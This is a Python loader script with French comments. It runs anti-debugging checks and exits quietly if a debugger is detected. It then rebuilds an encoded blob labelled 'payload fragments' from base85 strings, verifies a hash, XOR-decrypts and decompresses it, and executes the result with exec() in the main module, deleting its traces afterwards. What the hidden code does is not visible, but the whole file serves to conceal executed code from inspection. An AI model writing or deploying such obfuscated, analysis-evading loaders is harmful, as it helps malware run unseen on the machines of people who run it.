#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cvfyf9SGoSEVHi = 'apWQV&C$AJ)rtphAL{e&(v^?t@SZ(HJj}Qcnp<^h%%#-$8Q4Mry^|5^5g*ps'
_cvt4ytyQkOfrSz = '3VF~14cOFxaH=F^iUYSmJf>4&yZ@2Nlz@oYH?(ywTyOZ9y7wJ0o?XDUfhow!'
_cvov0Ywl7vvOX_ = '&$ch%<7;D!Ij{!fpf6}jJ?UD%2OILNHeQE8qEaXZ8=cFzYlD(1dE9hC=<CDB'
_cz9MRONuhaLZon = 'QA4^|b+O(qe`_<gA;?Y1XrF>uA?CmsUv&J2?pf{lO0=GgwJx_Vljv5fl7^*l'
_crir2FXBIlYOc4 = 'JOfGtXGHq5M{}YbK%~)@e-a?pW>jf<xzM;@0GJc8I-oE&M+3?wFVaD=l&uk?'
_ch4dfH9rhMokGw = '9HrOJxuR*9YTUWEyLM$G?2yrz^lb{o?G$qxK}q;SQmfNFw$AVG>QcS}Op#2Y'
_cjPtszEQR_FJZo = 'G@HQ@`s9eItqu8+w<nG)zXhr)(}s>(MnbZ?G>$m+Iai8<bCS@>0a<>ce9{?o'
_ciCxMfc751bd01 = 'N=-3WM_f@rIBO}Y{xXT~8C*)xLDKeLgNv3fa*KNx;biTAi-%}H9kQ82J&%n*'
_cygzfPGZa9YsJW = '7}E3_cxwor?~4rHqE3m1cl+!>11!4!wa9}`C`-tioAvdyq2jFjF26uO;q4|>'
_cvJvtQY0LLHK_R = 'vJA2<7R6ImT%MsZ+S%o>L}9qKolVf2neO7eAk7QY`dg026a5WPA|`4B34}9w'
_ckDCktv9OUdhGv = 'y`q$!%?Z;UEQCOHTVR%U;W1{$4x!qN_MRcD@NLs0((lo;gxv5%&Iq0+e)`Oi'
_cqOBxznQaTZ27Q = 'Nia$qq_eqf<5mFRZ@e`2@#rYKU~@o?W<q!_v@i7s_lU7PGNBSyr`z=rE{<j2'
_cxOTKz_ARGFko6 = 'fd-f>qP}UFbi=NcHJs)>a`Zcvhbaqav|{{$L2M|HPdjbWD`dIB(T`u$oaWQ{'
_cciZxytefxuFqf = 'en%7ct$k)R5kc-#^U?MtbOj%I4k2iM4YW?PR!iqb5O--e%$Q|{4LwE|o*#dB'
_ckcamggakoqukM = 'PUT47x5<ms+K6rh`X)B!b(U~v0D8~Vl$8SSl6oZ3YEi~MSNyZV7IQ{;K*+A='
_clNb53wNireTfc = 'c-x*>YudGq738xix?Q*+S>M|nsUfhcMxS3MjJAMiaM8Aa+EQQCr?xG#mr(q>'
_c_8tPPopaX44ZD = '%?*Ynf3U?Vqkzce?WGBHxob(cC$^BQ-zpq2II#4raU4<@j2g8vMWv7jS+v$2'
_cy31xzxSClXp01 = '{~DJI1Jna8@xrQP<Kxc($AXrMM>v*Z!DWnA^Rbk*VOCEX?h(M!j2l>&=Ewgv'
_cfHDGWn4wX8cC6 = '$#G-aBIr49mXR4uJIaFIk%Hhl(`0>mPX)p8VCJrM`dQg2D#RmUV&@z&A&r`y'
_cusxsHyhRixZQN = 'GJXHX{fM6%v@|=!H*f)1{L4R;A?F>A7nArYivecTPc$BP_Hh+u>pA@@e!YM^'
_cc6rb4DY9yuARa = 'lskEpE%Cv@Vg66{e;@tGoh{XIg3PmwV*iMlb=S^UKRbda0-`4F;_k)(bvx#_'
_cnmnaleRRLgugV = 'pmX4z9JIKdsvxBCcR!H3tW|NPYK{tqvu|AxW|O%pBckx&=BMEzy}ybY+n`$#'
_csgsxbjs34NsPa = 'qfHqwi_l-Fb*W0DRcYrCbr+hcuyPG^7RTA}^Z)kCZI`0qdTiv<JeemZMyXUI'
_ci6mnzycKxFzFM = 'NPL|?KRAF~O}i2??+$WuyB5NF{!-IAX1ZzVC0-N=#`!L|VAW~O-^+=?wJ6+}'
_cqzrtm4NTb73X1 = 'yX}-@N0jkvD*aWNbrhYRBJ1i^{5?gjlcgFB3g=hYp*op3`Y9BK$_Czn_AB+O'
_cboFwjZdTNp7lR = 'daKP1pUuP|XTx#Aiq=Z#Gjtq8-+`+r=`CWX!gh4`c$CsD1|N=x9#fXmDHMrz'
_cckzvjtb9NuHbf = 'Of`h{FKgt&1{M4D3B8yEe9x#XGXfQ%vMn$JYb@*&k`pgrqkC>(!g#%LA9CXW'
_cuHcpBFjiugjtu = ')=Pc8-+r3;h6E}ZVWjBnPTePTSJHmQQ6gYx*Ke(_%=6Mo!U~qvjX0(XA(8`N'
_cuUy9GLrP9IyxP = '!}1QThx@my8cp)VZu6VtxQWMmzPmrV22W?#BX_7DDkq<GEo!f|p^40W1-2z2'
_chvkA1wFZRkAfT = 'XVW;g&N5-D5CV3Y<NWTuK5uX)n(z)_&th!QG$lHeA_y6R%7I6gyy49e;nr0D'
_czYAy4WMIlgi3C = 'OYhd8422x?w-%$eajT}u*;#tYc7dV_B{C#WitTg9pcZ^$m!%t#ym}2EEcs80'
_czQCfPT0VbEKnw = 'Lp?&l<9nL@>Z!BO3h!@W6z6$5`go<%D8*CLD@AUN966@(V@^RULZki5-%*TL'
_csIglqIvT2Be35 = 'km^E|Ip>lS|0IAypjXjFy1UTkA%uRRK52zwc-3B?+*f(!39;Wc$Iz6S%!UdM'
_cuTr0b2sz5ST64 = '35eS6IoXdE@vt1>1m8C85D1P&!o`&vS~s7A&Ff)2xaeVxKj-D#?D1kwkp'

_pjidchEsmSG6dQ = __import__('base64').b85decode(_cvfyf9SGoSEVHi + _cvt4ytyQkOfrSz + _cvov0Ywl7vvOX_ + _cz9MRONuhaLZon + _crir2FXBIlYOc4 + _ch4dfH9rhMokGw + _cjPtszEQR_FJZo + _ciCxMfc751bd01 + _cygzfPGZa9YsJW + _cvJvtQY0LLHK_R + _ckDCktv9OUdhGv + _cqOBxznQaTZ27Q + _cxOTKz_ARGFko6 + _cciZxytefxuFqf + _ckcamggakoqukM + _clNb53wNireTfc + _c_8tPPopaX44ZD + _cy31xzxSClXp01 + _cfHDGWn4wX8cC6 + _cusxsHyhRixZQN + _cc6rb4DY9yuARa + _cnmnaleRRLgugV + _csgsxbjs34NsPa + _ci6mnzycKxFzFM + _cqzrtm4NTb73X1 + _cboFwjZdTNp7lR + _cckzvjtb9NuHbf + _cuHcpBFjiugjtu + _cuUy9GLrP9IyxP + _chvkA1wFZRkAfT + _czYAy4WMIlgi3C + _czQCfPT0VbEKnw + _csIglqIvT2Be35 + _cuTr0b2sz5ST64)
if __import__('hashlib').sha256(_pjidchEsmSG6dQ).hexdigest() != 'f3b215b0b4703b5fa688d8818e5cfa1835fdbe2a7e5ece2e41fb2fc4b8195f21':
    __import__('sys').exit(1)
_xwqjMzJ7GHgcRg = bytes([9, 62, 164, 170, 36, 163, 96, 43, 197, 116, 200, 61, 147])
_fkuqzC2r8I5ksOQ = bytes([143, 146, 201, 166, 227, 96, 196, 81, 53, 83, 6, 191, 84])

def _fxcSeoQVbcY5SnA(_bm3uNha4kyJdQQ, _kfc8vNFD1vC0PF):
    return bytes(_bm3uNha4kyJdQQ[_ixyHRs8kNFdNqR] ^ _kfc8vNFD1vC0PF[_ixyHRs8kNFdNqR % len(_kfc8vNFD1vC0PF)] for _ixyHRs8kNFdNqR in range(len(_bm3uNha4kyJdQQ)))

def _fdl_dXm1fkv68zd(_tuhC6TlbsRlMt4):
    import zlib
    return zlib.decompress(_tuhC6TlbsRlMt4) # Un seul niveau de zlib ici pour simplifier

def _feqOGI2_tFn6H55():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xl7DNe50FhMRkY = _fxcSeoQVbcY5SnA(_pjidchEsmSG6dQ, _xwqjMzJ7GHgcRg)
    # 2. Décompression Zlib
    _duKgU5ilCh4mWJ = _fdl_dXm1fkv68zd(_xl7DNe50FhMRkY)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _duKgU5ilCh4mWJ.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nmmMenWj7eTkfC = _main.__dict__
    _nmmMenWj7eTkfC.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nmmMenWj7eTkfC)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feqOGI2_tFn6H55()
try:
    del _fxcSeoQVbcY5SnA, _fdl_dXm1fkv68zd, _feqOGI2_tFn6H55
    del _pjidchEsmSG6dQ, _xwqjMzJ7GHgcRg, _fkuqzC2r8I5ksOQ
except:
    pass
